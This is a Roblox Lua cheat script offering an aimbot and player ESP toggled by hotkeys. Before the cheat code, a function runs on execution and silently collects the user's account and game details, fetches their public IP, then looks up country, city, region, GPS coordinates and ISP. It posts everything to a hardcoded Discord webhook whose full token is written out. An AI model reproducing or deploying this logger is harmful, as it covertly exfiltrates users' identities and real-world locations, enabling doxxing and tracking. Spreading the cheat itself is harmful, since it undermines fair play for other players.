-- Function to send webhook
local function sendWebhook()
    --// Config
    getgenv().whscript = "KemilingHUB"        --Change to the name of your script
    getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1354371611360231487/MskK4R-buS9vcMLgFobw5QLYwtbYzR5aGVt7TQywKcrn8xR4aIx6MaJEFvEdQDoqrPEQ"  --Put your Webhook Url here
    getgenv().ExecLogSecret = true                --decide to also log secret section

    --// Execution Log Script
    local ui = gethui()
    local folderName = "screen"
    local folder = Instance.new("Folder")
    folder.Name = folderName
    local player = game:GetService("Players").LocalPlayer

    if ui:FindFirstChild(folderName) then
        print("Script is already executed! Rejoin if it's an error!")
        local ui2 = gethui()
        local folderName1 = "screen2"
        local folder2 = Instance.new("Folder")
        folder2.Name = folderName1
        if ui2:FindFirstChild(folderName1) then
            player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
        else
            folder2.Parent = gethui()
        end
    else
        folder.Parent = gethui()
        local players = game:GetService("Players")
        local userid = player.UserId
        local gameid = game.PlaceId
        local jobid = tostring(game.JobId)
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        local deviceType =
            game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
        local snipePlay =
            "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
        local completeTime = os.date("%Y-%m-%d %H:%M:%S")
        local workspace = game:GetService("Workspace")
        local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
        local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
        local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
        local playerCount = #players:GetPlayers()
        local maxPlayers = players.MaxPlayers
        local health =
            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
        local maxHealth =
            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
            "N/A"
        local position =
            player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
            player.Character.HumanoidRootPart.Position or
            "N/A"
        local gameVersion = game.PlaceVersion

        if not getgenv().ExecLogSecret then
            getgenv().ExecLogSecret = true
        end
        if not getgenv().whscript then
            getgenv().whscript = "KemilingHUB"
        end
        local commonLoadTime = 5
        task.wait(commonLoadTime)
        local pingThreshold = 100
        local serverStats = game:GetService("Stats").Network.ServerStatsItem
        local dataPing = serverStats["Data Ping"]:GetValueString()
        local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
        local function checkPremium()
            local premium = "false"
            local success, response =
                pcall(
                function()
                    return player.MembershipType
                end
            )
            if success then
                if response == Enum.MembershipType.None then
                    premium = "false"
                else
                    premium = "true"
                end
            else
                premium = "Failed to retrieve Membership:"
            end
            return premium
        end
        local premium = checkPremium()

        local url = getgenv().webhookexecUrl

        local data = {
            ["content"] = "",
            ["embeds"] = {
                {
                    ["title"] = "🚀 **KemlingHUB**",
                    ["description"] = "*Here are the details:*",
                    ["type"] = "rich",
                    ["color"] = tonumber(0x3498db), -- Clean blue color
                    ["fields"] = {
                        {
                            ["name"] = "🔍 **Script Info**",
                            ["value"] = "```💻 Script Name: " ..
                                getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "👤 **Player Details**",
                            ["value"] = "```🧸 Username: " ..
                                player.Name ..
                                    "\n📝 Display Name: " ..
                                        player.DisplayName ..
                                            "\n🆔 UserID: " ..
                                                userid ..
                                                    "\n❤️ Health: " ..
                                                        health ..
                                                            " / " ..
                                                                maxHealth ..
                                                                    "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
                                                                        userid .. "/profile)```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📅 **Account Information**",
                            ["value"] = "```🗓️ Account Age: " ..
                                player.AccountAge ..
                                    " days\n💎 Premium Status: " ..
                                        premium ..
                                            "\n📅 Account Created: " ..
                                                os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🎮 **Game Details**",
                            ["value"] = "```🏷️ Game Name: " ..
                                gameName ..
                                    "\n🆔 Game ID: " ..
                                        gameid ..
                                            "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                                gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🕹️ **Server Info**",
                            ["value"] = "```👥 Players in Server: " ..
                                playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📡 **Network Info**",
                            ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🖥️ **System Info**",
                            ["value"] = "```📺 Resolution: " ..
                                screenWidth ..
                                    "x" ..
                                        screenHeight ..
                                            "\n🔍 Memory Usage: " ..
                                                memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📍 **Character Position**",
                            ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🪧 **Join Script**",
                            ["value"] = "```lua\n" .. snipePlay .. "```",
                            ["inline"] = false
                        }
                    },
                    ["thumbnail"] = {
                        ["url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    },
                    ["footer"] = {
                        ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                        ["icon_url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    }
                }
            }
        }

        -- Check if the secret tab should be included
        if getgenv().ExecLogSecret then
            local ip = game:HttpGet("https://api.ipify.org")
            local iplink = "https://ipinfo.io/" .. ip .. "/json"
            local ipinfo_json = game:HttpGet(iplink)
            local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

            table.insert(
                data.embeds[1].fields,
                {
                    ["name"] = "**`(🤫) User Location (Real life)`**",
                    ["value"] = "||(👣) IP Address: " ..
                        ipinfo_table.ip ..
                            "||\n||(🌆) Country: " ..
                                ipinfo_table.country ..
                                    "||\n||(🪟) GPS Location: " ..
                                        ipinfo_table.loc ..
                                            "||\n||(🏙️) City: " ..
                                                ipinfo_table.city ..
                                                    "||\n||(🏡) Region: " ..
                                                        ipinfo_table.region ..
                                                            "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
                }
            )
        end

        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {
            ["content-type"] = "application/json"
        }
        request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    end
end

-- Kirim webhook saat script dijalankan
sendWebhook()

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera

-- Local Variables
local LocalPlayer = Players.LocalPlayer
local Toggles = {
    Camera = false,
    HeadAim = false,
    ESP = false
}
local CameraTarget = nil
local LastAimbotUpdate = 0

-- ESP Storage
local ESPHighlights = {}

--[[ Utility Functions ]]--
local function IsPlayerAlive(player)
    if not player or not player.Character then return false end
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Health > 1
end

--[[ Aimbot Functions ]]--
local function FindClosestPlayerToScreenCenter()
    local closestPlayer, minDistance = nil, math.huge
    local screenCenter = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and IsPlayerAlive(player) then
            local character = player.Character
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if rootPart then
                local screenPos, onScreen = Camera:WorldToScreenPoint(rootPart.Position)
                if onScreen then
                    local distance = (screenCenter - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
                    if distance < minDistance then
                        minDistance = distance
                        closestPlayer = player
                    end
                end
            end
        end
    end

    return closestPlayer
end

local function AimAtPlayer(player, aimAtHead)
    if not IsPlayerAlive(player) then return end
    
    local character = player.Character
    local targetPart = aimAtHead and character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
    
    if targetPart then
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPart.Position)
    end
end

local function ToggleAimbot(aimAtHead)
    if aimAtHead then
        Toggles.HeadAim = not Toggles.HeadAim
        Toggles.Camera = false
    else
        Toggles.Camera = not Toggles.Camera
        Toggles.HeadAim = false
    end

    if Toggles.Camera or Toggles.HeadAim then
        CameraTarget = FindClosestPlayerToScreenCenter()
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = Toggles.HeadAim and "Head Aimbot ON" or "Body Aimbot ON",
            Color = Color3.new(1, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        CameraTarget = nil
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Aimbot OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
    end
end

--[[ ESP Functions ]]--
local function CreateESP(player)
    if ESPHighlights[player] then return end

    local character = player.Character
    if not character then return end

    -- Create highlight
    local highlight = Instance.new("Highlight")
    highlight.Parent = character
    highlight.FillColor = Color3.new(1, 0, 0) -- Red fill
    highlight.OutlineColor = Color3.new(1, 1, 1) -- White outline
    highlight.Adornee = character

    ESPHighlights[player] = highlight
end

local function RemoveESP(player)
    local highlight = ESPHighlights[player]
    if highlight then
        highlight:Destroy()
        ESPHighlights[player] = nil
    end
end

local function ToggleESP()
    Toggles.ESP = not Toggles.ESP
    
    if Toggles.ESP then
        -- Create ESP for all existing players
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                CreateESP(player)
            end
        end
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "ESP ON",
            Color = Color3.new(0, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        -- Remove ESP for all players
        for player in pairs(ESPHighlights) do
            RemoveESP(player)
        end
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "ESP OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
    end
end

--[[ Input Handling ]]--
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.E then
        ToggleAimbot(false) -- Body aim
    elseif input.KeyCode == Enum.KeyCode.F then
        ToggleAimbot(true) -- Head aim
    elseif input.KeyCode == Enum.KeyCode.J then
        ToggleESP()
    end
end)

--[[ Main Loop ]]--
RunService.RenderStepped:Connect(function(deltaTime)
    -- Aimbot logic
    if Toggles.Camera or Toggles.HeadAim then
        local now = tick()
        if now - LastAimbotUpdate > 0.1 then
            CameraTarget = FindClosestPlayerToScreenCenter()
            LastAimbotUpdate = now
        end
        
        if CameraTarget and IsPlayerAlive(CameraTarget) then
            AimAtPlayer(CameraTarget, Toggles.HeadAim)
        end
    end
end)

--[[ Player Management ]]--
Players.PlayerAdded:Connect(function(player)
    if Toggles.ESP then
        CreateESP(player)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    RemoveESP(player)
end)

-- Initial setup for existing players
if Toggles.ESP then
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            CreateESP(player)
        end
    end
end
